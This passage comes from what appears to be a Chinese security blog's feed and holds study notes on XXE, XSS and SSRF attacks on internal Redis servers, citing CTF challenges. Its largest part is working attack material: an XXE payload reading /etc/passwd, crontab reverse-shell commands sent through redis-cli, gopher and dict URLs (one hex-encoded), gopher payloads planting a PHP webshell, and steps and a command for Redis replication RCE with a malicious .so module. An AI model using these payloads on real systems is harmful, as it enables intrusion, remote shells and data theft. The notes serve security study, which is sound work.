%name;]&gt;</code></pre></div><p><code>%name</code>(参数实体)是在DTD中被引用的，而<code>&amp;name;</code>是在xml文档中被引用的</p><p>XXE主要是利用了DTD引用外部实体导致的漏洞</p><h3 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h3><p>既然XML可以从外部读取DTD文件，那我们就自然地想到了如果将路径换成另一个文件的路径，那么服务器在解析这个XML的时候就会把那个文件的内容赋值给SYSTEM前面的根元素中，只要我们在XML中让前面的根元素的内容显示出来，不就可以读取那个文件的内容了。这就造成了一个任意文件读取的漏洞</p><p>那如果我们指向的是一个内网主机的端口呢？是否会给出错误信息，我们是不是可以从错误信息上来判断内网主机这个端口是否开放，这就造成了一个内部端口被探测的问题。另外，一般来说，服务器解析XML有两种方式，一种是一次性将整个XML加载进内存中，进行解析；另一种是一部分一部分的、“流式”地加载、解析。如果我们递归地调用XML定义，一次性调用巨量的定义，那么服务器的内存就会被消耗完，造成了拒绝服务攻击</p><h2 id="XML外部实体注入-XML-External-Entity"><a href="#XML外部实体注入-XML-External-Entity" class="headerlink" title="XML外部实体注入(XML External Entity)"></a>XML外部实体注入(XML External Entity)</h2><p>基础的XXE注入— 外部实体注入本地DTD</p><p>基于盲注的XXE注入—XML解析器在响应中不显示任何错误</p><p>基于错误的XXE注入—成功解析之后，XML解析器始终显示SAME响应。（即“您的消息已被接收”），因此，我们可能希望解析器将文件的内容“打印”到错误响应中。</p><h3 id="基础的XXE注入"><a href="#基础的XXE注入" class="headerlink" title="基础的XXE注入"></a>基础的XXE注入</h3><p>SYSTEM标识符来引用外部实体的数据</p><div class="hljs code-wrapper"><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY a SYSTEM &quot;file:///etc/passwd&quot;&gt;  ]&gt;&lt;user&gt;&lt;username&gt;&amp;a;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;//a为实体名，&amp;a;为调用实体</code></pre></div><h3 id="基于盲注的XXE注入"><a href="#基于盲注的XXE注入" class="headerlink" title="基于盲注的XXE注入"></a>基于盲注的XXE注入</h3><h3 id="基于错误的XXE注入"><a href="#基于错误的XXE注入" class="headerlink" title="基于错误的XXE注入"></a>基于错误的XXE注入</h3><p><a href="https://www.cnblogs.com/backlion/p/9302528.html">https://www.cnblogs.com/backlion/p/9302528.html</a><br><a href="https://www.freebuf.com/vuls/175451.html">https://www.freebuf.com/vuls/175451.html</a><br><a href="https://www.freesion.com/article/9065247611/">https://www.freesion.com/article/9065247611/</a></p><h2 id="XXE攻击利用"><a href="#XXE攻击利用" class="headerlink" title="XXE攻击利用"></a>XXE攻击利用</h2><p>1.任意文件读取</p><p>2.内网信息探测</p><p>3.DOS攻击</p><p>4.远程命令执行</p><p>5.攻击内网网站</p><h2 id="攻击分类"><a href="#攻击分类" class="headerlink" title="攻击分类"></a>攻击分类</h2><p>1.拒绝服务攻击(DDoS)</p><p>2.基本的XXE攻击</p><p>3.高级的XXE攻击 - 直接反馈通道</p><p>4.高级的XXE攻击 - 外带数据(OOB)通道</p><p>5.SSRF攻击</p><p>6.XInclude攻击</p><p>7.XSLT攻击</p><p>………………………….</p><p>参考：</p><p><a href="https://www.cnblogs.com/backlion/p/9302528.html">https://www.cnblogs.com/backlion/p/9302528.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS跨站脚本攻击</title>
    <link href="/2022/03/23/xss/"/>
    <url>/2022/03/23/xss/</url>
    
    <content type="html"><![CDATA[<p>XSS跨站脚本攻击 </p><span id="more"></span><h1 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h1><p>xss也是一种注入攻击，当web应用对用户输入过滤不严格，攻击者写入恶意的脚本代码（HTML、JavaScript）到网页中时，如果用户访问了含有恶意代码的页面，恶意脚本就会被浏览器解析执行导致用户被攻击</p><p>常见的危害有：cookie窃取，session劫持，钓鱼攻击，蠕虫，ddos等</p><h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><p>反射性： 一般出现在URL参数中，以及网站搜索栏中，由于需要点击包含恶意代码的URL才可以触发，并且只能触发一次，也称为非持久性xss</p><h1 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h1><p>存储型：一般出现在留言板上，评论处，个人资料填写，等需要用户可以对网站写入数据的地方，比如一个论坛处由于对用户输入过滤不严格，导致攻击者在写入一段窃取cookie的恶意JavaScript代码到评论处，这段恶意代码会写入数据库中，当其他用户浏览写入代码的页面时，网站从数据库中读取恶意代码显示到网页中被浏览器执行，导致用户的cookie被窃取攻击者无需受害者密码既可以登陆账户，所以也被成为持久性xss，持久性xss比反射性xss危害性大得多</p><h1 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h1><p>Dom型xss DOM xss是基于dom文件对象模型的，前端脚本通过dom动态修改页面，由于不予服务端运行交互，而且代码是可见的，从前端获取dom中的数据在本地执行。常见的可以操作的dom对象有：url、location、referrer等。dom型的xss比较特殊，是一种基于dom树的xss，服务器端经常使用document.body.innertHtml等动态函数生成HTML页面，如果这些函数在引用某些变量时没有进行过滤检查，就会产生dom型的xss。dom型的xss可能是存储型的也可能是反射性的</p><p><a href="https://www.cnblogs.com/pursue-security/p/15260757.html">https://www.cnblogs.com/pursue-security/p/15260757.html</a></p><h1 id="XSS防御手段"><a href="#XSS防御手段" class="headerlink" title="XSS防御手段"></a>XSS防御手段</h1><p>（1）对于输出到html的输入内容，采用过滤关键词的方式，把预设的关键词转换成字符实体，例如将&lt; &gt;转换成&lt; 和 &gt;<br>（2）Content-Security-Policy（内容安全策略） 简称 csp<br>即只允许页面向我们允许的域名发起跨域请求，而不符合策略的恶意攻击则被阻挡。csp需要在Response Headers中添加</p><p>采用CSP（Content-Security-Policy） 一定程度上，可以大大减少xss</p><p>《内容安全策略CSP（Content-Security-Policy）》<br><a href="https://blog.csdn.net/m0_45406092/article/details/114115404">https://blog.csdn.net/m0_45406092/article/details/114115404</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用SSRF攻击内网Redis服务</title>
    <link href="/2022/03/17/ssrf-redis/"/>
    <url>/2022/03/17/ssrf-redis/</url>
    
    <content type="html"><![CDATA[<p>研究一下 利用ssrf攻击内网Redis服务</p><span id="more"></span><h1 id="利用ssrf攻击内网Redis服务"><a href="#利用ssrf攻击内网Redis服务" class="headerlink" title="利用ssrf攻击内网Redis服务"></a>利用ssrf攻击内网Redis服务</h1><p>SSRF，服务器端请求伪造，服务器请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。</p><h2 id="Redis服务"><a href="#Redis服务" class="headerlink" title="Redis服务"></a>Redis服务</h2><p>Redis 即 REmote Dictionary Server (远程字典服务)</p><p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统  </p><p>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API  </p><p>它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型  </p><p>默认端口：6379</p><h3 id="Redis语法"><a href="#Redis语法" class="headerlink" title="Redis语法"></a>Redis语法</h3><p>Redis 命令用于在 redis 服务上执行操作，其基本语法为： </p><div class="hljs code-wrapper"><pre><code>$ redis-cli</code></pre></div><p><a href="https://www.cnblogs.com/yuarvin/p/8557042.html">参考—Redis基本语法</a></p><h2 id="攻击payload解读"><a href="#攻击payload解读" class="headerlink" title="攻击payload解读"></a>攻击payload解读</h2><h5 id="反弹webshell-需服务器"><a href="#反弹webshell-需服务器" class="headerlink" title="反弹webshell(需服务器)"></a>反弹webshell(需服务器)</h5><div class="hljs code-wrapper"><pre><code>redis-cli -h $1 flushallecho -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.1/2333 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1redis-cli -h $1 config set dir /var/spool/cron/redis-cli -h $1 config set dbfilename rootredis-cli -h $1 save1.redis-cli -h $1 flushall调用redis的命令，-h这里指的是我们的主机ip地址，即$1这个变量，Flushall 命令用于清空整个 Redis 服务器的数据(删除所有数据库的所有 key)2.echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.1/8080 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1这里我们利用到了Redis的管道技术，可以查看使用手册，手册上对其的定义是Redis 管道技术可以在服务端未响应时，客户端可以继续向服务端发送请求，并最终一次性读取所有服务端的响应将前半段语句带入得到，可以看到后半段是一个bashshell反弹，前半段我在网上查了之后发现这应该是定时计划，就是定时的执行我们的bash反弹有三种定时的文件 /var/spool/cron/root ， /var/spool/cron/crontabs/root 以及/etc/crontab3.redis-cli -h $1 config set dir /var/spool/cron/指定本地数据库存放目录为/var/spool/cron/4.redis-cli -h $1 config set dbfilename rootconfig get：获取配置文件信息。config set：动态地调整 Redis 服务器的配置(configuration)而无须重启，可以修改的配置参数可以使用命令 CONFIG GET * 来列出，指定本地数据库文件名，默认值为dump.rdb5.redis-cli -h $1 save执行一个同步保存操作，将当前 Redis 实例的所有数据快照(snapshot)以 RDB 文件的形式保存到硬盘， 保存成功就返回 OK ，这一步就是保存到我们的硬盘文件上</code></pre></div><p><a href="https://www.cnblogs.com/ophxc/p/12872815.html">参考—Redis利用，攻击内网（ssrf）</a></p><h5 id="向目标服务器写码"><a href="#向目标服务器写码" class="headerlink" title="向目标服务器写码"></a>向目标服务器写码</h5><div class="hljs code-wrapper"><pre><code> flushall set 1 &lt;?php system(&quot;find / -name fla*&quot;);?&gt; config set dir /var/www/html config set dbfilename shell.php save</code></pre></div><p><img src="/2022/03/17/ssrf-redis/resp-3.png"></p><hr><h2 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h2><p>Redis的协议规范是 Redis Serialization Protocol (Redis序列化协议)</p><p>Redis 的客户端和服务端之间采取了一种独立的名为 RESP(REdis Serialization Protocol) 的协议，作者主要考虑了以下几个点：</p><ul><li>实现简单</li><li>快速解析</li><li>可读性强</li></ul><p>注意：RESP 虽然是为 Redis 设计的，但是同样也可以用于其他 C/S 的软件</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>RESP 主要可以序列化以下几种类型：整数，单行回复(简单字符串)，数组，错误信息，多行字符串  </p><p>Redis 客户端向将命令作为Bulk Strings的RESP数组发送到Redis服务器</p><h5 id="客户端—-gt-服务器"><a href="#客户端—-gt-服务器" class="headerlink" title="客户端—&gt;服务器"></a>客户端—&gt;服务器</h5><div class="hljs code-wrapper"><pre><code>192.168.163.128:6379&gt; set name testOK192.168.163.128:6379&gt; get name&quot;test&quot;192.168.163.128:6379&gt;</code></pre></div><p>抓取数据包</p><p><img src="/2022/03/17/ssrf-redis/resp-1.png"></p><p>hex–&gt;</p><p><img src="/2022/03/17/ssrf-redis/resp-2.png"></p><p>客户端向将命令作为Bulk Strings的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型  </p><p>数据包分析，首先是<br>*3，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）<br>$4代表字符串的长度<br>0d0a即\r\n表示结束符<br>+OK表示服务端执行成功后返回的字符串</p><p><a href="https://www.cnblogs.com/linuxsec/articles/11221756.html">参考—浅析Redis中SSRF的利用 -&gt; RESP协议</a></p><h5 id="服务器—-gt-客户端"><a href="#服务器—-gt-客户端" class="headerlink" title="服务器—&gt;客户端"></a>服务器—&gt;客户端</h5><p>服务端根据不同的命令回复不同类型的数据，但协议的每部分都是以 “\r\n” (CRLF) 结尾的</p><p>在 RESP 中, 一些数据的类型通过它的第一个字节进行回显判断：</p><ul><li>单行回复：回复的第一个字节是 “ + ”</li><li>错误信息：回复的第一个字节是 “ - ”</li><li>整形数字：回复的第一个字节是 “ : ”</li><li>多行字符串：回复的第一个字节是 “ $ ”</li><li>数组：回复的第一个字节是 “ * ”</li></ul><hr><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p>cURL是一个利用URL语法在命令行下工作的文件传输工具。它支持文件上传和下载，所以是综合传输工具。cURL还包含了用于程序开发的libcurl</p><p>cURL支持的通信协议有：FTP、FTPS、HTTP、HTTPS、Gopher、SCP、Telnet、DICT、FILE、LDAP、LDAPS、IMAP、POP3、SMTP和RTSP<br>cURL还支持SSL认证、HTTP POST、HTTP PUT、FTP</p><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><div class="hljs code-wrapper"><pre><code>curl_init() 初始化一个cURL会话curl_setopt() 设置一个cURL传输选项curl_exec() 执行cURL会话curl_close() 关闭cURL会话</code></pre></div><h3 id="curl请求网页"><a href="#curl请求网页" class="headerlink" title="curl请求网页"></a>curl请求网页</h3><div class="hljs code-wrapper"><pre><code>$url=&quot;&quot;;                //设置url$ch = curl_init();        //初使化curlcurl_setopt($ch, CURLOPT_URL, $url);              //请求的url，由形参传入curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);    //将得到的数据返回curl_setopt($ch, CURLOPT_HEADER, 0);            //不处理头信息curl_setopt($ch, CURLOPT_TIMEOUT, 10);            //连接超过10秒超时$output = curl_exec($ch);                        //执行curlcurl_close($ch);                                //关闭资源echo $output;                                    //返回内容$url=&quot;&quot;;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_TIMEOUT, 10);$output = curl_exec($ch);curl_close($ch);</code></pre></div><hr><h1 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h1><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口</p><p>Gopher 协议可以说是SSRF中的万金油。利用此协议可以攻击内网的 redis、ftp等等，也可以发送 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面</p><h3 id="Gopher协议格式"><a href="#Gopher协议格式" class="headerlink" title="Gopher协议格式"></a>Gopher协议格式</h3><div class="hljs code-wrapper"><pre><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></pre></div><ul><li><p>gopher的默认端口是6379  </p></li><li><p>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</p></li></ul><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><p><img src="/2022/03/17/ssrf-redis/gopher-1.png"></p><h3 id="Gopher协议GET传数据"><a href="#Gopher协议GET传数据" class="headerlink" title="Gopher协议GET传数据"></a>Gopher协议GET传数据</h3><h3 id="Gopher协议POST传数据"><a href="#Gopher协议POST传数据" class="headerlink" title="Gopher协议POST传数据"></a>Gopher协议POST传数据</h3><h3 id="url编码payload中的-0a改为-0d-0a"><a href="#url编码payload中的-0a改为-0d-0a" class="headerlink" title="url编码payload中的%0a改为%0d%0a"></a>url编码payload中的%0a改为%0d%0a</h3><p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/">参考—利用 Gopher 协议拓展攻击面</a></p><hr><h1 id="Dict-协议"><a href="#Dict-协议" class="headerlink" title="Dict 协议"></a>Dict 协议</h1><p>Dict 协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的</p><p>它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典  </p><p>Dict服务器和客户机使用TCP端口2628</p><h2 id="Dict-利用"><a href="#Dict-利用" class="headerlink" title="Dict 利用"></a>Dict 利用</h2><div class="hljs code-wrapper"><pre><code>dict://serverip:port/命令</code></pre></div><p>参数向服务器的端口请求为【命令:参数】，并在末尾自动补上\r\n(CRLF)，为漏洞利用增添了便利通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了</p><p><a href="https://www.cnblogs.com/zzjdbk/p/12970919.html">参考—SSRF漏洞用到的其他协议（dict协议，file协议）</a></p><h1 id="File-协议"><a href="#File-协议" class="headerlink" title="File 协议"></a>File 协议</h1><p>file协议主要用于访问本地计算机中的文件</p><p>file协议主要用于访问本地计算机中的文件</p><h2 id="File-利用"><a href="#File-利用" class="headerlink" title="File 利用"></a>File 利用</h2><p>file://文件路径</p><p>使用file协议可以直接读取目标操作系统的文件</p><p><a href="https://www.cnblogs.com/zzjdbk/p/12970919.html">参考—SSRF漏洞用到的其他协议（dict协议，file协议）</a></p><h1 id="反弹webshell-需服务器-1"><a href="#反弹webshell-需服务器-1" class="headerlink" title="反弹webshell(需服务器)"></a>反弹webshell(需服务器)</h1><h2 id="Gopher-协议"><a href="#Gopher-协议" class="headerlink" title="Gopher 协议"></a>Gopher 协议</h2><p>改成适配于 Gopher 协议的 URL</p><p>1.攻击地址<br>2.本地地址(反弹shell的地址)</p><div class="hljs code-wrapper"><pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></pre></div><p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/#h2.2_%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91-redis">参考—利用 Gopher 协议拓展攻击面</a></p><h2 id="Dict-协议-1"><a href="#Dict-协议-1" class="headerlink" title="Dict 协议"></a>Dict 协议</h2><p>1.攻击地址<br>2.本地地址(反弹shell的地址)</p><div class="hljs code-wrapper"><pre><code>curl dict://192.168.0.119:6379/set:mars:&quot;\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\n\n&quot;curl dict://192.168.0.119:6379/config:set:dir:/etc/curl dict://192.168.0.119:6379/config:set:dbfilename:crontabcurl dict://192.168.0.119:6379/bgsavecurl dict://192.168.0.119:6379/set:mars:\&quot;\\x0a\\x2a\\x20\\x2a\\x20\\x2a\\x20\\x2a\\x20\\x2a\\x20\\x72\\x6f\\x6f\\x74\\x20\\x62\\x61\\x73\\x68\\x20\\x2d\\x69\\x20\\x3e\\x26\\x20\\x2f\\x64\\x65\\x76\\x2f\\x74\\x63\\x70\\x2f\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x30\\x2e\\x31\\x31\\x39\\x2f\\x39\\x39\\x39\\x39\\x20\\x30\\x3e\\x26\\x31\\x0a\&quot;</code></pre></div><hr><h1 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h1><h2 id="Gopher-协议-1"><a href="#Gopher-协议-1" class="headerlink" title="Gopher 协议"></a>Gopher 协议</h2><p>改成适配于 Gopher 协议的 URL</p><p>url解码，修改payload</p><p>1.攻击地址</p><div class="hljs code-wrapper"><pre><code>//&lt;?php system(&quot;find / -name fla*&quot;);?&gt;需要注意换行也算字节数gopher://10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2440%0D%0A%0A%0A%3C%3Fphp%20system%28%22find%20/%20-name%20fla%2A%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A//&lt;?php system(&quot;cat /flag&quot;);?&gt;gopher://10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A---请求url/shell.php</code></pre></div><p><a href="https://err0r.top/article/Buuoj-WEB-Write-up/?highlight=ssrf">参考—err0r—EZ三剑客-EzWeb</a></p><p>题目—BUU—[GKCTF2020]EZ三剑客-EzWeb</p><hr><h1 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h1><p><a href="https://www.cnblogs.com/linuxsec/articles/11221756.html">https://www.cnblogs.com/linuxsec/articles/11221756.html</a></p><hr><h1 id="利用contrab计划任务反弹shell"><a href="#利用contrab计划任务反弹shell" class="headerlink" title="利用contrab计划任务反弹shell"></a>利用contrab计划任务反弹shell</h1><p><a href="https://www.cnblogs.com/linuxsec/articles/11221756.html">https://www.cnblogs.com/linuxsec/articles/11221756.html</a></p><hr><h1 id="Redis4-x-5-x从SSRF到RCE"><a href="#Redis4-x-5-x从SSRF到RCE" class="headerlink" title="Redis4.x/5.x从SSRF到RCE"></a>Redis4.x/5.x从SSRF到RCE</h1><p><a href="https://www.cnblogs.com/linuxsec/articles/11221756.html">https://www.cnblogs.com/linuxsec/articles/11221756.html</a></p><hr><h1 id="redis-主从复制-rce"><a href="#redis-主从复制-rce" class="headerlink" title="redis 主从复制 rce"></a>redis 主从复制 rce</h1><h2 id="主从复制原理"><a href="#主从复制原理" class="headerlink" title="主从复制原理"></a>主从复制原理</h2><p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。<br>redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis</p><p><img src="/2022/03/17/ssrf-redis/copy-1.png"></p><h2 id="三种方式建立主从复制"><a href="#三种方式建立主从复制" class="headerlink" title="三种方式建立主从复制"></a>三种方式建立主从复制</h2><p>1.配置文件写入 </p><div class="hljs code-wrapper"><pre><code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></pre></div><p>2.redis-server启动命令后加入 </p><div class="hljs code-wrapper"><pre><code>--slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></pre></div><p>3.连接到客户端之后执行</p><div class="hljs code-wrapper"><pre><code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></pre></div><p>PS：建立主从关系只需要在从节点操作就行了，主节点不用任何操作</p><h2 id="redis-module"><a href="#redis-module" class="headerlink" title="redis module"></a>redis module</h2><p>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能  </p><p>Redis模块是动态库，可以在启动时或使用 MODULE LOAD 命令加载到Redis中</p><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用全量复制将master上的RDB文件同步到slave上，这一步就是将我们的恶意so文件同步到slave上，从而加载恶意so文件达到rce的目的</p><p>slave 和 master 握手协议过程</p><p><img src="/2022/03/17/ssrf-redis/copy-2.png"></p><p>常量说明</p><div class="hljs code-wrapper"><pre><code>#define REPL_STATE_CONNECTING 2 /* 等待和master连接 *//* --- 握手状态开始 --- */#define REPL_STATE_RECEIVE_PONG 3 /* 等待PING返回 */#define REPL_STATE_SEND_AUTH 4 /* 发送认证消息 */#define REPL_STATE_RECEIVE_AUTH 5 /* 等待认证回复 */#define REPL_STATE_SEND_PORT 6 /* 发送REPLCONF信息，主要是当前实例监听端口 */#define REPL_STATE_RECEIVE_PORT 7 /* 等待REPLCONF返回 */#define REPL_STATE_SEND_CAPA 8 /* 发送REPLCONF capa */#define REPL_STATE_RECEIVE_CAPA 9 /* 等待REPLCONF返回 */#define REPL_STATE_SEND_PSYNC 10 /* 发送PSYNC */#define REPL_STATE_RECEIVE_PSYNC 11 /* 等待PSYNC返回 *//* --- 握手状态结束 --- */#define REPL_STATE_TRANSFER 12 /* 正在从master接收RDB文件 */</code></pre></div><p>利用全量复制将master上的RDB文件同步到slave上，这一步就是将我们的恶意so文件同步到slave上，从而加载恶意so文件达到rce的目的</p><h2 id="全量复制"><a href="#全量复制" class="headerlink" title="全量复制"></a>全量复制</h2><p><a href="https://www.cnblogs.com/linuxsec/articles/11221756.html">https://www.cnblogs.com/linuxsec/articles/11221756.html</a></p><h2 id="增量复制"><a href="#增量复制" class="headerlink" title="增量复制"></a>增量复制</h2><p><a href="https://www.cnblogs.com/linuxsec/articles/11221756.html">https://www.cnblogs.com/linuxsec/articles/11221756.html</a></p><h2 id="手动getshell"><a href="#手动getshell" class="headerlink" title="手动getshell"></a>手动getshell</h2><p>配置一个我们需要以master身份给slave传输so文件的服务</p><div class="hljs code-wrapper"><pre><code>PING 测试连接是否可用+PONG 告诉slave连接可用REPLCONF 发送REPLCONF信息，主要是当前实例监听端口+OK 告诉slave成功接受REPLCONF 发送REPLCONF capa+OK 告诉slave成功接受PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC</code></pre></div><p>将要攻击的redis服务器设置成我们的slave</p><div class="hljs code-wrapper"><pre><code>SLAVEOF ip port</code></pre></div><p>设置RDB文件    </p><p>PS : 这里注意以下exp.so是不能包含路径的，如果需要设置成其它目录请用</p><p>config set dir path</p><div class="hljs code-wrapper"><pre><code>config set dbfilename exp.so</code></pre></div><p>告诉slave使用全量复制并从我们配置的Rouge Server接收module</p><div class="hljs code-wrapper"><pre><code>+FULLRESYNC &lt;runid&gt; &lt;offest&gt;\r\n$&lt;len(payload)&gt;\r\n&lt;payload&gt;</code></pre></div><p>PS：其中<runid>无要求，不过长度一般为40，<offest>一般设置为1</offest></runid></p><h2 id="自动化getshell"><a href="#自动化getshell" class="headerlink" title="自动化getshell"></a>自动化getshell</h2><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的  </p><p>通过脚本实现一键自动化getshell：</p><p>1.生成恶意.so文件，下载RedisModules-ExecuteCommand使用make编译即可生成</p><div class="hljs code-wrapper"><pre><code>git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommandcd RedisModules-ExecuteCommand/make</code></pre></div><p>2.攻击端执行： python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so</p><div class="hljs code-wrapper"><pre><code>git clone https://github.com/Ridter/redis-rce.gitcd redis-rce/cp ../RedisModules-ExecuteCommand/src/module.so ./pip install -r requirements.txt python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so</code></pre></div><p><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">参考—redis 主从复制 漏洞详细利用原理和利用代码编写方式</a></p><p><a href="https://www.cnblogs.com/linuxsec/articles/11221756.html">参考—浅析Redis中SSRF的利用</a></p><p><a href="https://blog.csdn.net/whowhenhow5/article/details/121331789">参考例题—网鼎杯 2020 玄武组 SSRFMe</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF 服务器端请求伪造</title>
    <link href="/2022/03/15/ssrf/"/>
    <url>/2022/03/15/ssrf/</url>
    
